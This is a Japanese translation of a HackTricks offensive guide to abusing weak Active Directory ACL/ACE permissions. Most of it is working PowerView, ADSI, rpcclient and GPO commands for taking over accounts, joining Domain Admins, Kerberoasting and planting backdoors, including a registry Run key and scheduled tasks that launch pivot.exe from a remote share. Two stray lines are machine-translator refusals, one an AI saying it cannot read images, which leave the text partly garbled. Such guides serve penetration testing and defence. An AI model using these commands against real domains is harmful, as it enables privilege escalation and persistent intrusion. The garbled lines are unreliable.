# Active Directory ACL/ACEの悪用

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまでの全技術スタックにわたる問題を見つけることで、最も重要な脆弱性をより早く修正できます。今日[**無料で試す**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## コンテキスト

このラボは、Active Directoryの任意アクセス制御リスト(DACL)と、DACLを構成するアクセス制御エントリ(ACE)の弱い権限を悪用することを目的としています。

Active Directoryオブジェクト（ユーザーやグループなど）はセキュリティ可能なオブジェクトであり、DACL/ACEは誰がそれらのオブジェクトを読み取り/変更できるかを定義します（例：アカウント名の変更、パスワードのリセットなど）。

「ドメイン管理者」セキュリティ可能オブジェクトのACEの例はこちらで見ることができます：

![](../../../.gitbook/assets/1.png)

攻撃者として私たちが関心を持つActive Directoryオブジェクトの権限とタイプには以下のものがあります：

* **GenericAll** - オブジェクトに対する完全な権利（グループへのユーザー追加やユーザーのパスワードリセット）
* **GenericWrite** - オブジェクトの属性の更新（例：ログオンスクリプト）
* **WriteOwner** - オブジェクトの所有者を攻撃者が制御するユーザーに変更してオブジェクトを乗っ取る
* **WriteDACL** - オブジェクトのACEを変更し、攻撃者にオブジェクトの完全な制御権を与える
* **AllExtendedRights** - グループへのユーザー追加やパスワードリセットの能力
* **ForceChangePassword** - ユーザーのパスワードを変更する能力
* **Self (Self-Membership)** - 自分自身をグループに追加する能力

このラボでは、上記のACEのほとんどを探索し、悪用しようとします。

可能な限り多くの[BloodHoundのエッジ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)とActive Directoryの[拡張権限](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)に慣れておくことが重要です。なぜなら、評価中に一般的でないものに遭遇するかもしれないからです。

## ユーザーに対するGenericAll

powerviewを使用して、攻撃者のユーザー`spotless`がADオブジェクトのユーザー`delegate`に`GenericAll rights`を持っているかどうかを確認しましょう：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
私たちのユーザー`spotless`が`GenericAll`権限を持っていることが確認できます。これにより攻撃者はアカウントを乗っ取ることができます：

![](../../../.gitbook/assets/2.png)

*   **パスワード変更**: 以下のコマンドでそのユーザーのパスワードを変更できます。

```bash
net user <username> <password> /domain
```
*   **ターゲット型Kerberoasting**: アカウントに**SPN**を設定してユーザーを**kerberoastable**にし、kerberoastしてオフラインでクラックを試みることができます。

```powershell
# SPNを設定
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# ハッシュを取得
.\Rubeus.exe kerberoast /user:<username> /nowrap
# SPNをクリア
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# また、ツール https://github.com/ShutdownRepo/targetedKerberoast を使用して
# 一人または全ユーザーのハッシュを取得することもできます
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ターゲット型ASREPRoasting**: **事前認証を無効にする**ことでユーザーを**ASREPRoastable**にし、その後ASREProastを行うことができます。

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## グループにおけるGenericAll

`Domain admins`グループが弱い権限を持っていないか見てみましょう。まず、その`distinguishedName`を取得しましょう：
```csharp
Get-NetGroup "domain admins" -FullData
```
Since there is no English text provided other than the image reference, there is nothing to translate. If you provide the English text, I can translate it into Japanese for you.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
攻撃者ユーザー`spotless`が再び`GenericAll`権限を持っていることがわかります：

![](../../../.gitbook/assets/5.png)

これにより、私たち（ユーザー`spotless`）を`Domain Admin`グループに追加することができます：
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

同じことはActive DirectoryやPowerSploitモジュールを使っても実現できます：
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write on Computer/User

* **コンピュータオブジェクト**にこれらの権限がある場合、[Kerberos **リソースベースの制約付き委任**: コンピュータオブジェクトの乗っ取り](../resource-based-constrained-delegation.md)を実行できます。
* ユーザーにこれらの権限がある場合、[このページで最初に説明されている方法の一つ](./#genericall-on-user)を使用できます。
* または、コンピュータまたはユーザーにそれがある場合、**Shadow Credentials**を使用してそれを偽装できます：

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty on Group

制御下にあるユーザーが`Domain Admin`グループの`All`オブジェクトに対する`WriteProperty`権限を持っている場合：

![](../../../.gitbook/assets/7.png)

再び自分自身を`Domain Admins`グループに追加し、権限を昇格させることができます：
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## グループにおけるSelf (Self-Membership)

攻撃者が自分自身をグループに追加することを可能にする別の権限：

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Self-Membership)

攻撃者が自分自身をグループに追加することを可能にするもう一つの権限：
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
Since the provided text is an image and I am an AI text-based model, I'm unable to directly translate the text within images. If you can provide the text in a written format, I would be happy to assist with the translation.
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

`User-Force-Change-Password` オブジェクトタイプに `ExtendedRight` を持っている場合、現在のパスワードを知らなくてもユーザーのパスワードをリセットできます：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

powerviewを使って同じことを行う:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

パスワードセキュア文字列変換をいじる必要がない別の方法：
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
![](../../../.gitbook/assets/15.png)

...または、インタラクティブセッションが利用できない場合のワンライナー:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

そして、Linuxからこれを達成する最後の方法：
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
詳細情報：

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/ja-jp/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/ja-jp/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/ja-jp/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/ja-jp/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## グループに対するWriteOwner

攻撃前に`Domain Admins`の所有者が`Domain Admins`であることに注意してください：

![](../../../.gitbook/assets/17.png)

ACE列挙後、制御下にあるユーザーが`ObjectType:All`に`WriteOwner`権限を持っていることがわかった場合
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/18.png)

...`Domain Admins` オブジェクトの所有者を私たちのユーザー、この場合は `spotless` に変更することができます。`-Identity` で指定された SID は `Domain Admins` グループの SID です：
```
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## ユーザーに対するGenericWrite
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/20.png)

`WriteProperty` は `ObjectType` に対して行われ、この特定のケースでは `Script-Path` です。攻撃者は `delegate` ユーザーのログオンスクリプトパスを上書きすることができ、これは次に `delegate` ユーザーがログオンするとき、そのシステムは私たちの悪意のあるスクリプトを実行することを意味します:
```
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
以下は、ADのユーザーの~~`delegate`~~ログオンスクリプトフィールドが更新されたことを示しています：

![](../../../.gitbook/assets/21.png)

## グループに対するGenericWrite

これにより、グループのメンバーとして新しいユーザー（例えば自分自身）を設定できます：
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より早く修正できるようにします。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまで、あなたのテックスタック全体にわたる問題を見つけます。今日、[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)してください。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

もしグループのオーナーであれば、私が `Test` ADグループのオーナーであるように：

![](../../../.gitbook/assets/22.png)

もちろん、これはpowershellを通じて行うことができます：
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
```markdown
![](../../../.gitbook/assets/23.png)

そのADオブジェクトに`WriteDACL`がある場合：

![](../../../.gitbook/assets/24.png)

...ADSIの魔法を少し加えることで、自分自身に[`GenericAll`](../../../windows/active-directory-methodology/broken-reference/)権限を与えることができます：
```
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
ADオブジェクトを完全に制御できるようになりました：

![](../../../.gitbook/assets/25.png)

これは、新しいユーザーをグループに追加できることを意味します。

Active Directoryモジュールと`Set-Acl` / `Get-Acl`コマンドレットを使用してこれらの権限を悪用することはできなかったことに注目してください：
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **ドメインのレプリケーション (DCSync)**

**DCSync** 権限は、ドメイン自体に対して以下の権限を持つことを意味します: **DS-Replication-Get-Changes**、**Replicating Directory Changes All**、そして **Replicating Directory Changes In Filtered Set**。\
[**DCSync 攻撃についてもっと学ぶ。**](../dcsync.md)

## GPO デリゲーション <a href="#gpo-delegation" id="gpo-delegation"></a>

時々、特定のユーザー/グループが `offense\spotless` ユーザーの場合のように、グループポリシーオブジェクトを管理するためのアクセス権を委任されることがあります:

![](../../../.gitbook/assets/a13.png)

PowerViewを利用してこのように確認することができます:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
以下は、ユーザー `offense\spotless` が **WriteProperty**、**WriteDacl**、**WriteOwner** 権限を含む他のいくつかの権限を持っていることを示しており、これらは悪用される可能性があります：

![](../../../.gitbook/assets/a14.png)

### GPO権限の列挙 <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

上記のスクリーンショットから、ObjectDNが `New Group Policy Object` GPOを指していることがわかります。ObjectDNは `CN=Policies` を指しており、また `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` もGPOの設定で以下のように強調表示されています：

![](../../../.gitbook/assets/a15.png)

特に誤設定されたGPOを探す場合、PowerSploitの複数のcmdletを連鎖させることができます：
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**適用される特定のポリシーを持つコンピュータ**

現在、GPO `Misconfigured Policy` が適用されているコンピュータ名を解決できます：
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**特定のコンピュータに適用されるポリシー**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
```markdown
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**特定のポリシーが適用されたOU**
```
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **GPOを悪用する -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

この誤設定を悪用してコード実行を行う方法の一つは、GPOを通じて即時スケジュールされたタスクを以下のように作成することです：
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
```markdown
上記は、侵害されたボックスのローカル`administrators`グループにユーザーspotlessを追加します。コード実行前にグループにユーザー`spotless`が含まれていないことに注意してください：

### GroupPolicyモジュール **- GPOの悪用**

{% hint style="info" %}
GroupPolicyモジュールがインストールされているかどうかは、`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`で確認できます。緊急時には、ローカル管理者として`Install-WindowsFeature –Name GPMC`でインストールすることができます。
{% endhint %}
```
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
このペイロードは、GPOが更新された後、コンピュータ内で誰かがログインする必要があります。

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- GPOの悪用**

{% hint style="info" %}
GPOを作成することはできませんので、RSATを使用して作成するか、既に書き込みアクセス権を持っているものを変更する必要があります。
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシー更新の強制 <a href="#force-policy-update" id="force-policy-update"></a>

前述の**GPOの悪用による更新は**約90分ごとに再読み込みされます。\
もしコンピュータへのアクセスがある場合、`gpupdate /force` で強制的に更新をかけることができます。

### 内部の仕組み <a href="#under-the-hood" id="under-the-hood"></a>

`Misconfigured Policy` GPOのスケジュールされたタスクを観察すると、そこに私たちの`evilTask`が存在しているのが見えます：

![](../../../.gitbook/assets/a22.png)

以下は、GPO内の悪意のあるスケジュールされたタスクを表す`New-GPOImmediateTask`によって作成されたXMLファイルです：

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
### ユーザーとグループ <a href="#users-and-groups" id="users-and-groups"></a>

同じ権限昇格は、GPOのユーザーとグループ機能を悪用することで達成できます。以下のファイルの6行目に注目してください。ユーザー `spotless` がローカルの `administrators` グループに追加されています - 私たちはユーザーを他のものに変更したり、別のユーザーを追加したり、さらにはユーザーを別のグループ/複数のグループに追加することもできます。なぜなら、示された場所のポリシー設定ファイルを、ユーザー `spotless` に割り当てられたGPO委任権により修正できるからです：

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

さらに、ログオン/ログオフスクリプトを利用したり、レジストリを使って自動実行を設定したり、.msiをインストールしたり、サービスを編集したりといったコード実行の手段を考えることができます。

## 参考文献

* 最初に、この情報は主に[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)からコピーされました。
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より早く修正しましょう。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまで、技術スタック全体にわたる問題を見つけ出します。今日[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ください。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手しましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
